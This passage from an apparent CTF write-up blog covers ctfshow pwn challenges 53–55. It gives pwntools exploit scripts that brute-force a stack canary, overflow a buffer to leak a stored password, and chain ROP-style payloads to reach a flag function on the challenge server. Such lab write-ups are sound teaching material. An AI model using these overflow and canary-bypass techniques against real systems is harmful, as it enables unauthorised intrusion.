class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        flag<span class=\"token operator\">=</span><span class=\"token number\">0x08048696</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"How many bytes do you want to write to the buffer?\\n>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">'999'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"I\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>canary<span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token comment\">#+b\"a\"*16+p32(flag)#+p32(0)+p32(876)+p32(877)#+p32(system)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        a<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Canary Value Incorrect!'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span> <span class=\"token comment\">#不输出这个字符串代表该字符匹配成功</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            canary<span class=\"token operator\">+=</span>p8<span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token comment\">#将匹配字节加入到后面（canary j  的顺序）</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gg\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x08048696</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"How many bytes do you want to write to the buffer?\\n>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">'999'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"I\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>canary<span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn54\"><a class=\"anchor\" href=\"#pwn54\">#</a> pwn54</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p>题目描述： <code>再近一点靠近点快被融化</code></p>\n<p>32 位程序：</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p><code>main:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> s1<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-1A0h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> v5<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+40h] [ebp-160h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+140h] [ebp-60h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+180h] [ebp-20h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+184h] [ebp-1Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+194h] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"==========CTFshow-LOGIN==========\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Username:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">,</span> <span class=\"token number\">256</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token operator\">*</span>v8 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">,</span> <span class=\"token string\">\",\\nInput your Password.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/password.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/password.txt: No such file or directory.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  v5<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome! Here's what you want:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token function\">flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You has been banned!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里有个 flag，利用 s1 和 s 比较相等就能得到～～（也可以利用 <code>\\x00</code>  截断）~~ ，s 是 password，而 s1 是我们输入的 <s>利用 <code>\\x00</code>  绕过就能得到</s>，</p>\n<p>可以发现</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/Z6YQX_IO%40I37%25%60A_%24%25%60SJ7V.png\" alt=\"\" /></p>\n<p>读入的 password 也被读入栈上，而我们输入 name 的大小 256 刚好到达 password 的位置，这样以来可以覆盖末尾的空字符时 puts 函数将 password 一起输出</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn51')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28227</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Username:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">255</span><span class=\"token operator\">+</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"aab\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>password<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload<span class=\"token operator\">=</span>password</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%28FNPB%4071WJ%28%7B%2970S%25%24OT%7B%7BU.png\" alt=\"\" /></p>\n<p>没有按预期直接获得 flag，但是得到了 password</p>\n<p>这里要注意用户名等于 256 时会对 pwssword 有影响，所以得到密码后，再次连接输入小于 256 长度的 name 即可</p>\n<p>【这里可能是因为被追加的 input password 给影响了 s 的栈内值，从 /password.txt 文件中读取密码时，你正在向一个已经被部分污染的 s 缓冲区写入。但是，由于 fgets 只会覆盖它读取的内容长度，所以不会完全清除 s 中的所有污染内容，除非从文件中读取的字符数大于或等于覆盖的字符数。】</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn54'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote(\"pwn.challenge.ctf.show\",28227)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Username:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">255</span><span class=\"token operator\">+</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">264</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>password<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28227</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Username:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload<span class=\"token operator\">=</span>password</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn55\"><a class=\"anchor\" href=\"#pwn55\">#</a> pwn55</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目：</h2>\n<p>题目描述： <code>你是我的谁，我的我是你的谁</code></p>\n<p>32 位程序：</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/DL2S7IDAFRC8%40%5B%289RS%405T%601.png\" alt=\"\" /></p>\n<p>从图里可以清晰的看出来有栈溢出，和 flag 后门，不过需要让 <code>flag1</code>  和 <code>flag2</code>  以及 <code>a1</code>  满足条件，因此要逐个执行</p>\n<p>32 位程序的函数调用顺序是：函数本身，返回地址，参数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xacacacac</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xbdbdbdbd</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里是 flag_func1 函数，返回地址位 flag_func2, 没有参数，flag_func 的返回地址为 flag，参数为 0xacacacac ，flag 的返回地址为 0，参数为 0xbdbdbdbd ，这里没有成功【gpt：所以，0xacacacac 在这里有双重角色：它首先作为 flag_func1 的参数，然后它作为 flag 函数的返回地址。但这是因为你的 payload 的特定结构决定的】</p>\n<p>后续我的理解： 这里的 flag 是作为 flag_func2 的返回地址了，并不是作为函数本身所以没给他返回地址（但是有参数？）</p>\n<p>而：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xacacacac</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xbdbdbdbd</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>就可以，不知道为什么没有 flag 的返回地址</p>\n<p>改用寄存器传参：<br />\n先函数，再寄存器，再参数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>rbx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xacacacac</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>rbx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xbdbdbdbd</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>exp:</p>\n<figure class=\"highlight python\"><figcaption 